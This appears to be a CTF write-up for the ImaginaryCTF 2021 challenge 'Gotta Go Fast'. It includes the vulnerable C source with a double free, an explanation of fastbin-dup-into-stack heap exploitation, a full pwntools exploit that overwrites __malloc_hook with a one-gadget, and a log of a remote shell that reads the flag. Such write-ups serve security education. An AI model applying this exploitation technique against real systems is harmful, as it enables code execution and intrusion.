## Gotta Go Fast

> Points: 400
>
> Solves: 23

### Description:
```
People keep volunteering to be tributes. I really think they should stop doing that, I've seen the management system get messed up by this.
```

### Attachments:
```
https://imaginaryctf.org/r/E284-gotta_go_fast
https://imaginaryctf.org/r/A848-gotta_go_fast.c
nc chal.imaginaryctf.org 42009
```

## Analysis:

The C language source code is provided below.
There is a double free vulnerability in list_remove() function.

```c
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef struct Tribute {
    char name[100];
    short district;
    short index_in_district;
} Tribute;

typedef struct TributeList {
    Tribute* tributes[100];
    struct TributeList* next;
    int in_use;
} TributeList;

TributeList* head;

int list_append(Tribute* t) {
    int offset = 0;
    TributeList* cur = head;
    while (cur->in_use == 100) {
        if (cur->next == NULL) {
            cur->next = malloc(sizeof(TributeList));
            cur->next->next = NULL;
            cur->next->in_use = 0;
        }
        offset += 100;
        cur = cur->next;
    }
    offset += cur->in_use;
    cur->tributes[cur->in_use++] = t;
    return offset;
}

void list_remove(int idx) {
    TributeList* last = head;
    while (last->next != NULL) {
        if (last->next->in_use == 0) {
            free(last->next);
            last->next = NULL;
            break;
        }
        last = last->next;
    }

    TributeList* cur = head;
    while ((cur->in_use == 100 && idx >= 100)) {
        if (!cur->next) {
            abort();
        }
        cur = cur->next;
        idx -= 100;
    }
    Tribute* t = last->tributes[last->in_use - 1];
    last->tributes[last->in_use - 1] = cur->tributes[idx];
    free(last->tributes[last->in_use - 1]);
    cur->tributes[idx] = t;
    last->in_use--;
}

int readint(int lo, int hi) {
    int res = -1;
    while (1) {
        printf("> ");
        scanf("%d", &res);
        if (res >= lo && res <= hi) {
            return res;
        }
    }
}

void init() {
    head = malloc(sizeof(TributeList));
    head->next = NULL;
    head->in_use = 0;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    alarm(180);
}

void menu() {
    puts("What would you like to do?");
    puts(" [0] Draft a new tribute");
    puts(" [1] Remove a tribute from the list (because someone volunteered in their place again, people should really stop doing that, it messes with our management system)");
    puts(" [2] See an overview of the current tributes");
    puts(" [3] Start the games, may the odds be ever in your favor!");
}

void draft() {
    Tribute* t = malloc(sizeof(Tribute));
    puts("For which district will this tribute fight?");
    t->district = readint(1, 12);
    puts("What's the position among the tributes for this district?");
    t->index_in_district = readint(1, 2);
    puts("Least importantly, what's their name?");
    scanf("%99s", t->name);

    printf("Noted, this is tribute %d\n", list_append(t));
}

void undraft() {
    puts("Which tribute should be undrafted?");
    int idx = readint(0, INT_MAX);
    list_remove(idx);
    puts("done.");
}

void list() {
    int idx = 0;
    TributeList* cur = head;
    while (cur) {
        for (int i = 0; i < cur->in_use; i++, idx++) {
            Tribute* t = cur->tributes[i];
            printf("Tribute %d [%s] fights in position %d for district %d.\n", idx, t->name, t->index_in_district, t->district);
        }
        cur = cur->next;
    }
}

void run() {
    puts("TODO: implement this simulation into the matrix.");
    exit(0);
}

int have_diagnosed = 0;
void diagnostics() {
    if (have_diagnosed) {
        puts("I understand things might be broken, but we should keep some semblance of security.");
        abort();
    }
    have_diagnosed = 1;
    puts("I take it the management system was ruined by volunteers again? Just let me know which memory address you need...");
    unsigned long long x = 0;
    scanf("%llu", &x);
    printf("%p\n", *(void**)x);
}

int main() {
    init();

    puts("Welcome to the Hunger Games management system.");

    while (1) {
        menu();
        int choice = readint(0, 4);
        switch (choice) {
            case 0:
                draft();
                break;
            case 1:
                undraft();
                break;
            case 2:
                list();
                break;
            case 3:
                run();
                break;
            case 4:
                diagnostics();
                break;
            default:
                abort(); // Shouldn't happen anyway
        }
    }
}

```

## Solution:

Since libc was not given, I had to guess libc.

Since the vulnerability is double free in the undraft () function, I tried to double free with fastbin after filling tcache, but an error occurs.
After trying various things, I found from the following message that the server is not tcache compatible, and it is libc-2.23.so on Ubuntu 16.04 which does not support tcache.

```
 "*** Error in `/app/run': double free or corruption (fasttop): 0x0000000000e0e3c0 ***\n"
```

I was able to create a fake chunk using the following technique using Fastbin's double-free vulnerability, and free the 0x90 size chunk to leak the libc address.

https://inaz2.hatenablog.com/entry/2016/10/13/203019  :`fastbin dup into stack`

State of fastbin when using `fastbin dup into stack`:
```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x6033b0 —▸ 0x603340 ◂— 0x6033b0
0x80: 0x0
```

Heap state when libc leaks:
```asm
0x6033b0:	0x0001000100000000	0x0000000000000091
0x6033c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78  <= libc leak
0x6033d0:	0x0000000000000000	0x0000000000000000
0x6033e0:	0x0000000000000000	0x0000000000000000
0x6033f0:	0x0000000000000000	0x0000000000000000
0x603400:	0x0001000100000000	0x0000000000000000
0x603410:	0x0000000000000000	0x0000000000000000
0x603420:	0x0001000100000000	0x0000000000000071
0x603430:	0x0000000000000000	0x0000000000000011
0x603440:	0x0000000000000090	0x0000000000000010
0x603450:	0x0000000000000000	0x0000000000000011
```

For shell startup, I was able to write One gadget to __malloc_hook and start the shell using the same technique of `fastbin dup into stack`.

## Exploit code:
```python
# Local : Ubuntu 16.04
# Server: Ubuntu 16.04

from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './gotta_go_fast'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42009
  s = remote(HOST, PORT)
  #libc = ELF('./libc-2.27.so')
else:
  s = process(BINARY)
  libc = elf.libc

def Draft(dist, pos, name):
  s.sendlineafter("> ", "0")
  s.sendlineafter("> ", str(dist))
  s.sendlineafter("> ", str(pos))
  s.sendlineafter("name?\n", name)

def Draft_noreturn(dist, pos, name):
  s.sendlineafter("> ", "0")
  s.sendlineafter("> ", str(dist))
  s.sendlineafter("> ", str(pos))
  s.sendafter("name?\n", name)

def Remove(idx):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(idx))

def See():
  s.sendlineafter("> ", "2")

def Heap_leak(addr):
  s.sendlineafter("> ", "4")
  s.sendlineafter("need...\n", str(addr))

# heap leak
Heap_leak(elf.sym.head)
heap_leak = int(s.recvuntil("\n"), 16)
heap_base = heap_leak - 0x10
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

Draft(1, 1, (p64(0)+p64(0x71))*6)
Draft(1, 1, "AA")
Draft(1, 1, (p64(0)+p64(0x11))*6)

# Double free in fastbin
Remove(1)
Remove(0)
Remove(2)

Draft(1, 1, p64(heap_base + 0x390))
Draft(1, 1, "BB")
Draft(1, 1, "CC")

# libc leak
Draft(1, 1, "A"*0x10+p64(0x0001000100000000)+p64(0x91))
Remove(0)
See()

s.recvuntil("Tribute 2 [")
libc_leak = u64(s.recvuntil("]")[:-1]+b"\x00\x00")
libc_base = libc_leak - 0x3c4b78
malloc_hook = libc_base + 0x3c4b10
one_gadget_offset = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadget = libc_base + one_gadget_offset[2]
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

Draft(1, 1, "DD")
Draft(1, 1, "EE")
Draft(1, 1, "FF")

# Double free in fastbin
Remove(4)
Remove(3)
Remove(5)

# Set one_gadget in __malloc_hook 
Draft(1, 1, p64(malloc_hook - 0x23))
Draft(1, 1, "GG")
Draft(1, 1, "HH")
Draft(1, 1, "I"*0x13+p64(one_gadget))

# Start One gadget 
s.sendlineafter("> ", "0")

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Gotta_Go_Fast_400$ python solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Gotta_Go_Fast_400/gotta_go_fast'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Opening connection to chal.imaginaryctf.org on port 42009: Done
heap_leak = 0x1b5d010
heap_base = 0x1b5d000
libc_leak = 0x7fad7a822b78
libc_base = 0x7fad7a45e000
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 2876
-rw-r--r-- 1 nobody nogroup  879740 Jul 23 06:42 admin.zip
-rw-r--r-- 1 nobody nogroup      35 Jul 23 06:42 flag.txt
-rwxr-xr-x 1 nobody nogroup  162632 Jul 23 06:42 ld-2.23.so
-rwxr-xr-x 1 nobody nogroup 1868984 Jul 23 06:42 libc-2.23.so
-rwxr-xr-x 1 nobody nogroup   21312 Jul 23 06:42 run
$ cat flag.txt
ictf{s4n1c_w1ns_th3_hung3r_G4M3S!}
```
